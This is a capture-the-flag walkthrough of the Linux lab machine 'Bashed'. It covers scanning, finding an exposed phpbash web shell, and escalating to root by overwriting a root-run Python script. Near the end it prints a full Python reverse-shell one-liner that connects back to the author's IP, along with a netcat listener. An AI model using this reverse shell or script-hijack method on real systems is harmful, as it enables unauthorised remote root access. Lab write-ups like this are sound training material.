# Bashed 

Machine Level: Easy <br />
OS: Linux 

## Scanning 
I ran an nmap scan using the aggressive flag to identify some services. 
```
ajread@aj-ubuntu:~$ nmap -A [REDACTED]
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-16 21:14 CST
Nmap scan report for [REDACTED]
Host is up (0.19s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.51 seconds
```
## Enumeration 
I conducted some enumeration using gobuster and found that there was an interesing subdirectory on port 80 as ```/dev/phpbash.php```. At the directory, there is a command line for me to use. 
```
www-data@bashed:/var/www/html/dev#
```
The commandline has me as user ```www-data```. 
```
www-data@bashed:/var/www/html/dev# whoami
www-data
www-data@bashed:/var/www/html/dev# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Initial Access
With the command line in the ```phpbash.php```, I was able to navigate to the user home directory and read the user flag.
```
www-data@bashed:/var/www/html/dev# cd /home
www-data@bashed:/home# ls
arrexel
scriptmanager
www-data@bashed:/home# cd arrexel
www-data@bashed:/home/arrexel# ls
user.txt
www-data@bashed:/home/arrexel# wc -c user.txt
33 user.txt
```
## Privilege Escalation 
Going through some normal privilege escalation checks, I wanted to see if I was able to run anything as ```sudo```. It turned out that I was able to run a ```scriptmanager``` with such privileges. 
```
www-data@bashed:/home/arrexel# sudo -l
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```
I found a ```/scripts``` folder that I was able to read the contents of using ```scriptmanager``` permissions. 
```
www-data@bashed:/# sudo -u scriptmanager ls -la /scripts
total 16
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 .
drwxr-xr-x 23 root root 4096 Jun 2 2022 ..
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py
-rw-r--r-- 1 root root 12 Jan 17 15:44 test.txt
```
It looked like ```test.py``` writes to ```test.txt```. 
```
www-data@bashed:/# sudo -u scriptmanager cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```
Now, I rewrote the ```test.py``` file since it was able to be edited by ```scriptmanager``` but only run by ```root``` because it required the ability to write to a ```test.txt``` file that is owned by ```root```. I changed the file to be a reverse shell in python with a connection back to my local IP and port using ```echo``` and ```tee```. 
```
echo 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LOCAL IP]",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' | sudo -u scriptmanager tee /scripts/test.py
```
I had some issues setting up the python reverse shell. I had to create one that was a one liner without spaces, found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python).

I opened a listener on my local machine and waited for the connection to come through. And it did! 
```
ajread@aj-ubuntu:~$ nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on [REDACTED] 33616
# id 
id 
uid=0(root) gid=0(root) groups=0(root)
# whoami
whoami
root
```
I was able to read the root flag as well. 
```
wc -c /root/root.txt
33 /root/root.txt
```